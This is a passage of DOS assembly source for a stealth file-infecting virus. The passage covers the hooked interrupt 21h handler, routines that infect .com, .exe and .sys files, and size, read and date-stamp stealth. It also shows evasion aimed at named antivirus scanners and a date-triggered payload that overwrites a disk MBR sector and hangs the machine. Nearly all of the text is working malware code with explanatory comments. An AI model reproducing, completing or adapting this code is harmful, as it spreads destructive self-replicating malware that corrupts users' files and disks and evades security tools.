                   ;Read stealth
                   cmp bh,(3Fh xor 0FFh)
                   jne stealth_06
                   jmp dos_read
   stealth_06:
                   ;Disinfect if debuggers exec
                   cmp bx,(4B01h xor 0FFFFh)
                   jne stealth_07
                   jmp dos_load_exec
   stealth_07:
                   ;Disinfect if file write
                   cmp bh,(40h xor 0FFh)
                   jne stealth_08
                   jmp dos_write
   stealth_08:
                   ;Get file date/time
                   cmp bx,(5700h xor 0FFFFh)
                   jne stealth_09
                   jmp dos_get_time
   stealth_09:
                   ;Set file date/time
                   cmp bx,(5701h xor 0FFFFh)
                   jne m21h_exit
                   jmp dos_set_time
   m21h_exit:
                   ;Free int 24h
                   call unhook_ints
                   call pop_all
                   ;Get control back to dos
                   jmp dword ptr cs:[old21h]

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Get dos date and payload                                                  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_get_date:
                   ;Get regs values on function entry
                   call pop_all

                   ;Call dos function
                   call dos_call

                   ;Check if date is 4th of June
                   cmp dx,0604h
                   je activate_now
                   clc
                   retf 02h

   activate_now:

                   ;Reset hd
                   xor ax,ax
                   int 13h

                   ;Overwrite mbr copy
                   mov bx,ax
                   mov ax,0301h
                   mov cx,0003h
                   mov dx,0080h
                   int 13h

                   ;Set video-mode 80*25 16-Colors
                   mov ax,0003h
                   int 10h

                   ;Set cursor position
                   mov ah,02h
                   xor bh,bh
                   mov dx,0B16h
                   int 10h

                   ;Print string + beep
                   push cs
                   pop ds
                   mov si,offset txt_credits_1
                   call loop_beep_string

                   ;Set cursor position
                   mov ah,02h
                   xor bh,bh
                   mov dx,0C16h
                   int 10h

                   ;Print string + beep
                   push cs
                   pop ds
                   mov si,offset txt_credits_2
                   call loop_beep_string
   hang_machine:
                   ;Endless loops rulez :P
                   jmp hang_machine

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Directory stealth with functions 11h and 12h (fcb)                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   ff_fcb:
                   ;Call dos function
                   call pop_all
                   call dos_call

                   ;Save all regs
                   call push_all

                   ;Check for errors
                   cmp al,255
                   je nofound_fcb

                   ;Get current PSP
                   mov ah,62h
                   call dos_call

                   ;Check if call comes from DOS
                   mov es,bx
                   cmp bx,es:[16h]
                   jne nofound_fcb
                   mov bx,dx
                   mov al,ds:[bx+00h]
                   push ax

                   ;Get DTA
                   mov ah,2Fh
                   call dos_call
                   pop ax
                   inc al
                   jnz fcb_ok
                   add bx,07h
   fcb_ok:
                   ;Check if infected
                   mov ax,word ptr es:[bx+17h]
                   and al,1Fh
                   cmp al,1Fh
                   jne nofound_fcb

                   ;Restore seconds
                   and byte ptr es:[bx+17h],0E0h

                   ;Restore original file size
                   sub word ptr es:[bx+1Dh],inf_byte_size
                   sbb word ptr es:[bx+1Fh],0000h
   nofound_fcb:
                   ;Restore some registers and return
                   call unhook_ints
                   call pop_all
                   iret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Search stealth with functions 4Eh and 4Fh (handle)                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   ff_handle:
                   ;Call dos function
                   call pop_all
                   call dos_call
                   jnc ffhok

                   ;Exit if error, return flags to caller
                   call unhook_ints
                   stc
                   retf 02h
   ffhok:
                   ;Save result
                   call push_all

                   ;Get DTA
                   mov ah,2Fh
                   call dos_call

                   ;Check if infected
                   mov ax,word ptr es:[bx+16h]
                   and al,1Fh
                   cmp al,1Fh
                   jne nofound_handle

                   ;Restore seconds field
                   and byte ptr es:[bx+16h],0E0h

                   ;Restore original size
                   sub word ptr es:[bx+1Ah],inf_byte_size
                   sbb word ptr es:[bx+1Ch],0000h
   nofound_handle:
                   ;Restore some registers and exit
                   call unhook_ints
                   call pop_all
                   clc
                   retf 02h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Exec ( load program )                                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_load_exec:
                   ;Open file for read-only
                   mov ax,3D00h
                   call dos_call
                   jnc loaded
                   jmp m21h_exit
   loaded:
                   xchg bx,ax
                   jmp do_disinfect

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Write to file                                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_write:
                   call pop_all
                   call push_all
   do_disinfect:
                   ;Get sft address in es:di
                   call get_sft
                   jc bad_operation

                   ;Check if file is infected
                   mov al,byte ptr es:[di+0Dh]
                   mov ah,1Fh
                   and al,ah
                   cmp al,ah
                   je clear_header
   bad_operation:
                   jmp load_error
   clear_header:
                   ;Save and set file open mode (read/write)
                   mov cx,0002h
                   xchg cx,word ptr es:[di+02h]
                   push cx

                   ;Save and set file attribute
                   xor al,al
                   xchg al,byte ptr es:[di+04h]
                   push ax

                   ;Save and set file pointer position
                   push word ptr es:[di+15h]
                   push word ptr es:[di+17h]

                   ;Get file true size if write operation
                   cmp byte ptr cs:[dos_function+01h],(40h xor 0FFh)
                   jne no_size_fix

                   ;Add virus size to file size
                   add word ptr es:[di+11h],inf_byte_size
                   adc word ptr es:[di+13h],0000h
   no_size_fix:
                   ;Point to old header in file
                   call seek_end
                   sub word ptr es:[di+15h],file_header_size+01h
                   sbb word ptr es:[di+17h],0000h

                   ;Read old header and encryption key
                   push cs
                   pop ds
                   mov ah,3Fh
                   mov cx,file_header_size+01h
                   mov dx,offset old_header
                   call dos_call
                   jc exit_disin

                   ;Decrypt header
                   call decrypt_header

                   ;Write old header
                   call seek_begin
                   mov dx,offset old_header
                   mov ah,40h
                   mov cx,file_header_size
                   call dos_call

                   ;Truncate file
                   call seek_end
                   sub word ptr es:[di+15h],inf_byte_size
                   sbb word ptr es:[di+17h],0000h
                   xor cx,cx
                   mov ah,40h
                   call dos_call
   exit_disin:
                   ;Restore file pointer position
                   pop word ptr es:[di+17h]
                   pop word ptr es:[di+15h]

                   ;Restore file attribute
                   pop ax
                   mov byte ptr es:[di+04h],al

                   ;Restore file open mode
                   pop word ptr es:[di+02h]

                   ;Do not set file date and file time on closing
                   or byte ptr es:[di+06h],40h

                   ;Clear seconds field
                   and byte ptr es:[di+0Dh],0E0h
   load_error:
                   ;Check if write function
                   cmp byte ptr cs:[dos_function+01h],(40h xor 0FFh)
                   je not_load

                   ;Close file
                   mov ah,3Eh
                   call dos_call
   not_load:
                   jmp m21h_exit

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Get file date/time                                                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_get_time:
                   ;Call function
                   call pop_all
                   call dos_call
                   jnc ok_get_time

                   ;Exit if error
                   call unhook_ints
                   stc
                   retf 02h
   ok_get_time:
                   ;Save result
                   call push_all

                   ;Check if file is already infected
                   mov al,cl
                   mov ah,1Fh
                   and al,ah
                   cmp al,ah
                   jne no_get_time

                   ;Get function result
                   call pop_all

                   ;Clear infection marker
                   and cl,0E0h
                   jmp short exit_get_time
   no_get_time:
                   call pop_all
   exit_get_time:
                   call unhook_ints
                   clc
                   retf 02h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Set file date/time                                                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_set_time:
                   ;Get function parameters
                   call pop_all
                   call push_all

                   ;Get address of sft entry
                   call get_sft
                   jc no_set_time

                   ;Check if file is already infected
                   mov al,byte ptr es:[di+0Dh]
                   mov ah,1Fh
                   and al,ah
                   cmp al,ah
                   je ok_set_time
   no_set_time:
                   ;Exit if not infected or error
                   jmp m21h_exit
   ok_set_time:
                   ;Perform time change but restore our marker
                   call pop_all
                   or cl,1Fh
                   call push_all
                   jmp m21h_exit

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Open file                                                                 ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_open:
                   ;Call dos function
                   call pop_all
                   call dos_call
                   jnc do_open_file

                   ;Exit if error
                   call unhook_ints
                   stc
                   retf 02h
   do_open_file:
                   ;Save result
                   call push_all

                   ;Get sft for file handle
                   xchg bx,ax
                   call get_sft
                   jc no_changes

                   ;Check file name in sft
                   push es
                   pop ds
                   mov si,di
                   add si,0020h
                   cld
                   lodsw

                   ;Check for chklist
                   cmp ax,"HC"
                   jne check_open_infection
                   lodsw
                   cmp ax,"LK"
                   jne check_open_infection
                   lodsw
                   cmp ax,"SI"
                   jne check_open_infection

                   ;Close file
                   mov ah,3Eh
                   call dos_call

                   ;Exit with error ( file not found )
                   call unhook_ints
                   call pop_all
                   mov ax,0002h
                   stc
                   retf 02h

   check_open_infection:

                   ;Check if file is infected
                   mov al,byte ptr es:[di+0Dh]
                   mov ah,1Fh
                   and al,ah
                   cmp al,ah
                   jne no_changes

                   ;If infected stealth true size
                   sub word ptr es:[di+11h],inf_byte_size
                   sbb word ptr es:[di+13h],0000h
   no_changes:
                   ;Open operation complete, return to caller
                   call unhook_ints
                   call pop_all
                   clc
                   retf 02h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Read file                                                                 ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_read:
                   ;Restore function entry regs
                   call pop_all
                   call push_all

                   ;Duplicate handle
                   mov ah,45h
                   call dos_call
                   jc no_read_stealth
                   xchg bx,ax
                   push ax

                   ;Close new handle in order to update directory entry
                   mov ah,3Eh
                   call dos_call
                   pop bx

                   ;Get address of sft entry
                   call get_sft
                   jc no_read_stealth

                   ;Check if file is already infected
                   mov al,byte ptr es:[di+0Dh]
                   mov ah,1Fh
                   and al,ah
                   cmp al,ah
                   jne no_read_stealth

                   ;Check and save current offset in file
                   mov ax,word ptr es:[di+15h]
                   cmp ax,file_header_size
                   jae no_read_stealth
                   cmp word ptr es:[di+17h],0000h
                   jne no_read_stealth

                   ;Save file-pointer position into header
                   mov word ptr cs:[file_offset],ax
                   call pop_all

                   ;Save address of read buffer
                   mov word ptr cs:[read_off],dx
                   mov word ptr cs:[read_seg],ds

                   ;Perform read operation
                   call dos_call
                   jnc check_read

                   ;Error during file read
                   call unhook_ints
                   stc
                   retf 02h

   no_read_stealth:
                   ;Exit if no read stealth
                   jmp m21h_exit
   check_read:
                   ;Restore regs and get file sft
                   call push_all
                   call get_sft

                   ;Save offset position
                   push word ptr es:[di+15h]
                   push word ptr es:[di+17h]

                   ;Save file size
                   push word ptr es:[di+11h]
                   push word ptr es:[di+13h]

                   ;Add virus size to file size
                   add word ptr es:[di+11h],inf_byte_size
                   adc word ptr es:[di+13h],0000h

                   ;Point to old header in file
                   call seek_end
                   sub word ptr es:[di+15h],file_header_size+01h
                   sbb word ptr es:[di+17h],0000h

                   ;Read old header and encryption key
                   push cs
                   pop ds
                   mov ah,3Fh
                   mov cx,file_header_size+01h
                   mov dx,offset old_header
                   call dos_call
                   jc exit_read

                   ;Decrypt header
                   call decrypt_header

                   ;Move old header into read buffer
                   les di,dword ptr cs:[read_ptr]
                   mov si,offset old_header
                   mov cx,file_header_size-01h
                   mov ax,word ptr cs:[file_offset]
                   add di,ax
                   add si,ax
                   sub cx,ax
                   cld
                   rep movsb
   exit_read:
                   ;We need this again
                   call get_sft

                   ;Restore file size
                   pop word ptr es:[di+13h]
                   pop word ptr es:[di+11h]

                   ;Restore old offset in file
                   pop word ptr es:[di+17h]
                   pop word ptr es:[di+15h]

                   ;Restore regs and exit
                   call unhook_ints
                   call pop_all
                   clc
                   retf 02h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Terminate program                                                         ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_terminate_prog:

                   ;Try to infect file that was executed
                   ;(filename in our buffer)

                   push cs
                   pop ds
                   mov dx,offset execute_filename
                   jmp infect_file_ds_dx

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Exec ( execute program )                                                  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_exec:
                   ;Restore function entry regs
                   call pop_all
                   call push_all

                   ;Save segmet of parameter block
                   push es

                   ;Copy filename into our buffer
                   mov si,dx
                   mov di,offset execute_filename
                   push cs
                   pop es
   copy_filename:
                   lodsb
                   stosb
                   or al,al
                   jnz copy_filename

                   ;Restore segment of parameter block
                   pop es

                   ;Check if file to execute is win.com
                   cmp word ptr ds:[si-04h],"OC"
                   jne no_win_com
                   cmp word ptr ds:[si-08h],"IW"
                   jne no_win_com
                   cmp word ptr ds:[si-06h],".N"
                   jne no_win_com

                   ;Add parameters to win.com
                   call find_end_string
                   jc exit_add_param
                   mov cx,0005h
                   mov bx,offset win_param_string
                   jmp short found_end_string
   no_win_com:
                   ;Check if file to execute is tbscan.exe
                   cmp word ptr ds:[si-07h],"NA"
                   jne exit_add_param
                   cmp word ptr ds:[si-09h],"CS"
                   jne exit_add_param
                   cmp word ptr ds:[si-0Bh],"BT"
                   jne exit_add_param

                   ;Add parameters to tbscan.exe
                   call find_end_string
                   jc exit_add_param
                   mov cx,0006h
                   mov bx,offset tbscan_param_string

   found_end_string:

                   ;Add to number of characters
                   add byte ptr ds:[di],cl

                   ;Number of characters + carriage ret
                   inc cx
                   mov di,si

                   ;Point over carriage ret of original command parameter string
                   dec di

                   ;Get offset of our param string
                   mov si,bx
                   push ds
                   pop es
                   push cs
                   pop ds

                   ;Write it over original command parameter string
                   rep movsb
   exit_add_param:
                   ;Return to virus int 21h handler
                   jmp m21h_exit

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Find end of command parameter string                                      ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   find_end_string:
                   ;Get address of command parameter string
                   lds si,dword ptr es:[bx+02h]
                   mov di,si

                   ;Check if no parameters
                   lodsb
                   or al,al
                   jnz no_zero_param
                   inc si
                   clc
                   ret
   no_zero_param:
                   ;Find end of command parameter string
                   mov cx,007Fh

   search_carriage_ret:

                   lodsb
                   cmp al,0Dh
                   jne try_next_char
                   clc
                   ret
   try_next_char:
                   loop search_carriage_ret
                   stc
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Infect file ( ds:dx ptr to filename )                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   infect_file_ds_dx:

                   ;Open file for read-only
                   mov ax,3D00h
                   call dos_call
                   jnc ok_file_open
                   jmp file_error
   ok_file_open:
                   xchg bx,ax
                   jmp short from_open

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Infect file on close                                                      ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   dos_close:
                   ;Get function parameters
                   call pop_all
                   call push_all

                   ;Duplicate handle
                   mov ah,45h
                   call dos_call
                   jc file_error
                   xchg bx,ax
                   push ax

                   ;Close new handle in order to update directory entry
                   mov ah,3Eh
                   call dos_call
                   pop bx
   from_open:
                   ;Check if file infection is disabled
                   cmp byte ptr cs:[file_infection_flag],0FFh
                   jne file_error

                   ;Get sft address in es:di
                   call get_sft
                   jc file_error

                   ;Check device info word
                   mov ax,word ptr es:[di+05h]

                   ;Check if character device handle
                   test al,80h
                   jnz file_error

                   ;Check if remote file handle
                   test ah,0Fh
                   jnz file_error

                   ;Check if file is already infected
                   mov al,byte ptr es:[di+0Dh]
                   mov ah,1Fh
                   and al,ah
                   cmp al,ah
                   je file_error

                   ;Check file name in sft
                   mov cx,0Bh
                   mov si,di
                   add si,20h
   name_loop:
                   ;Get a pair of characters
                   mov ax,word ptr es:[si]

                   ;Do not infect files with digit in their file name
                   cmp al,"0"
                   jb no_digit
                   cmp al,"9"
                   jbe file_error
   no_digit:
                   ;Do not infect files with "V" character in their filename
                   cmp al,"V"
                   je file_error

                   ;Do not infect files with "MO" into their filenames
                   cmp ax,"OM"
                   je file_error

                   ;Do not infect files with "IO" into their filenames
                   cmp ax,"OI"
                   je file_error

                   ;Do not infect files with "DO" into their filenames
                   cmp ax,"OD"
                   je file_error

                   ;Do not infect files with "IB" into their filenames
                   cmp ax,"BI"
                   je file_error

                   ;Next character
                   inc si
                   loop name_loop

                   ;Get first pair
                   mov ax,word ptr es:[di+20h]

                   ;Do not infect Thunderbyte antivirus utils
                   cmp ax,"BT"
                   je file_error

                   ;Do not infect McAfee's Scan
                   cmp ax,"CS"
                   je file_error

                   ;Do not infect F-Prot scanner
                   cmp ax,"-F"
                   je file_error

                   ;Do not infect Solomon's Guard
                   cmp ax,"UG"
                   jne file_infection
   file_error:
                   jmp critical_exit
   file_infection:
                   ;Save and set file open mode (read/write)
                   mov cx,0002h
                   xchg cx,word ptr es:[di+02h]
                   push cx

                   ;Save and set file attribute
                   xor al,al
                   xchg al,byte ptr es:[di+04h]
                   push ax
                   test al,04h
                   jnz system_file

                   ;Save and set file pointer position
                   push word ptr es:[di+15h]
                   push word ptr es:[di+17h]

                   ;Read file header
                   call seek_begin
                   push cs
                   pop ds
                   mov ah,3Fh
                   mov cx,file_header_size
                   mov dx,offset file_buffer
                   call dos_call
                   jc exit_inf

                   ;Seek to end of file and get file size
                   call seek_end

                   ;Do not infect too small files
                   or dx,dx
                   jnz ok_min_size
                   cmp ax,inf_byte_size
                   jbe exit_inf
   ok_min_size:
                   ;Point si to file_buffer
                   mov si,offset file_buffer
   check_sys:
                   ;Check for .sys extension
                   cmp word ptr es:[di+28h],"YS"
                   jne check_exe
                   cmp byte ptr es:[di+2Ah],"S"
                   jne check_exe
                   jmp inf_sys
   check_exe:
                   ;Check for .exe mark in file header
                   mov cx,word ptr cs:[si+00h]

                   ;Add markers M+Z
                   add cl,ch
                   cmp cl,"Z"+"M"
                   jne check_com

                   ;Check for .exe extension
                   cmp word ptr es:[di+28h],"XE"
                   jne check_com
                   cmp byte ptr es:[di+2Ah],"E"
                   jne check_com
                   jmp inf_exe
   check_com:
                   ;Avoid infecting .exe type here
                   cmp cl,"Z"+"M"
                   je exit_inf

                   ;Check for .com extension
                   cmp word ptr es:[di+28h],"OC"
                   jne exit_inf
                   cmp byte ptr es:[di+2Ah],"M"
                   jne exit_inf
                   jmp inf_com
   exit_inf:
                   ;Restore file pointer position
                   pop word ptr es:[di+17h]
                   pop word ptr es:[di+15h]
   system_file:
                   ;Restore file attribute
                   pop ax
                   mov byte ptr es:[di+04h],al

                   ;Restore file open mode
                   pop word ptr es:[di+02h]

                   ;Do not set file date/time on closing
                   or byte ptr es:[di+06h],40h
   critical_exit:
                   ;Check if close function
                   cmp byte ptr cs:[dos_function+01h],(3Eh xor 0FFh)
                   je no_close_file

                   ;Close file
                   mov ah,3Eh
                   call dos_call
   no_close_file:
                   jmp m21h_exit

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Infect .sys files                                                         ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   inf_sys:
                   ;Don't infect too big .sys files
                   cmp ax,0FFFFh-(mem_byte_size*02h)
                   jae exit_inf

                   ;Check next driver address
                   cmp word ptr cs:[si],0FFFFh
                   jne exit_inf
                   cmp word ptr cs:[si+02],0FFFFh
                   jne exit_inf

                   ;Copy .sys file header
                   call copy_header

                   ;Store virus entry point ( file size ) over strategy routine address
                   mov word ptr cs:[si+06h],ax

                   ;Save delta offset for poly engine
                   mov word ptr cs:[file_delta],ax

                   ;Store return subroutine
                   mov word ptr cs:[exit_address],offset exit_sys - \
                                                  offset host_ret

                   ;Encrypt and infect
                   jmp get_control

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Infect .com files                                                         ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   inf_com:
                   ;Don't infect too big .com files
                   cmp ax,0FFFFh-(mem_byte_size*02h)
                   jae exit_inf

                   ;Save first bytes of file
                   call copy_header

                   ;Get file length as entry point
                   sub ax,03h

                   ;Write a jump to virus into header
                   mov byte ptr cs:[si+00h],0E9h
                   mov word ptr cs:[si+01h],ax

                   ;Save delta offset for poly engine
                   add ax,0103h
                   mov word ptr cs:[file_delta],ax

                   ;Store return subroutine

                   mov word ptr cs:[exit_address],offset exit_com - \
                                                  offset host_ret

                   ;Encrypt and infect
                   jmp get_control

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Infect .exe files                                                         ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   inf_exe:
                   ;Make a copy of .exe file header
                   call copy_header

                   ;Don't infect Windows new exe files
                   cmp word ptr cs:[si+19h],0040h
                   jae bad_exe

                   ;Don't infect overlays
                   cmp word ptr cs:[si+1Ah],0000h
                   jne bad_exe

                   ;Check maxmem field
                   cmp word ptr cs:[si+0Ch],0FFFFh
                   jne bad_exe

                   ;Save file size
                   push ax
                   push dx

                   ;Save old exe entry point
                   push word ptr cs:[si+14h]
                   pop word ptr cs:[exe_ip]
                   push word ptr cs:[si+16h]
                   pop word ptr cs:[exe_cs]

                   ;Get file size div 10h
                   mov cx,0010h
                   div cx

                   ;Subtract header size
                   sub ax,word ptr cs:[si+08h]

                   ;New entry point at file end
                   mov word ptr cs:[si+14h],dx
                   mov word ptr cs:[si+16h],ax

                   ;Save delta offset for poly engine
                   mov word ptr cs:[file_delta],dx

                   ;Set new offset of stack segment in load module
                   inc ax
